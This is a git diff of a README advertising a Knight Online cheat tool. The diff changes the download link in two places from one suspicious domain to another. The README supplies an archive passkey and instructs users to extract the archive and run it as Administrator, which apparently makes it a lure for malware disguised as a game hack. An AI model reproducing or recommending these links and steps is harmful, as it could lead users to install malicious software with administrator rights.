@@ -6,7 +6,7 @@ Knight Online hack with noclip, speedhack, startpos switcher, hitbox viewer, ico
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **community tools**, **overlay menu**, and **helper m
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Knight Online.
 4. Run the hack **as Administrator**.
